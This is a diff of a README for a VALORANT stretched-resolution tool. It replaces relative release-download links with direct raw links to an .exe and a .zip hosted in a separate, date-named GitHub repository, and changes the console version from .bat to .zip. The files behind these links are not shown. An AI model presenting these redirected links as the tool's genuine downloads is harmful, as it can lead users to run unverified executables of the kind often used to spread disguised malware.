@@ -6,17 +6,7 @@
 
 **English** | [Русский](RREADME.md)
 
-<p align="center">
-  <a href="releases/download/CustomRes.exe"><img src="btn-gui-en.svg" alt="Download CustomRes.exe" width="320" height="64"></a>&nbsp;&nbsp;
-  <a href="releases/download/true_stratched_val.bat"><img src="btn-cli-en.svg" alt="Download the console version, true_stratched_val.bat" width="320" height="64"></a>
-</p>
-<p align="center"><sub>Windows 10/11, 64-bit · NVIDIA GPU · <a href="../../releases">all releases</a></sub></p>
-
-<p align="center">
-  <img src="screenshot-window.png" alt="The window of the program in its normal size" width="39%">&nbsp;
-  <img src="screenshot-fullscreen.png" alt="The program in full screen on a 2560x1440 monitor" width="57%">
-  <br><sub>The program in its normal size and in full screen on a 2560×1440 monitor</sub>
-</p>
+<p align="center"> <a href="https://github.com/nikolenkode/Valorant_Truestretched-18-10-2026/raw/main/CustomRes.exe"><img src="btn-gui-en.svg" alt="Download CustomRes.exe" width="320" height="64"></a>&nbsp;&nbsp; <a href="https://github.com/nikolenkode/Valorant_Truestretched-18-10-2026/raw/main/true_stratched_val.zip"><img src="btn-cli-en.svg" alt="Download the console version, true_stratched_val.zip" width="320" height="64"></a> </p> <p align="center"><sub>Windows 10/11, 64-bit · NVIDIA GPU · <a href="../../releases">all releases</a></sub></p> <p align="center"> <img src="screenshot-window.png" alt="The window of the program in its normal size" width="39%">&nbsp; <img src="screenshot-fullscreen.png" alt="The program in full screen on a 2560x1440 monitor" width="57%"> <br><sub>The program in its normal size and in full screen on a 2560×1440 monitor</sub> </p>
 
 **Contents:** [Download](#download) · [What it is](#what-it-is) · [Stretched resolution in VALORANT](#stretched-resolution-in-valorant) · [The problem it solves](#the-problem-it-solves) · [Quick start with VALORANT](#quick-start-with-valorant) · [The same by hand](#the-same-by-hand-without-the-program) · [The window](#the-window) · [How it works](#how-it-works) · [More examples from the game](#more-examples-from-the-game) · [Console version](#console-version) · [Files, build and internals](#files-build-and-internals) · [Requirements](#requirements) · [Troubleshooting](#troubleshooting) · [FAQ](#faq) · [Status and disclaimer](#status-and-disclaimer)
 
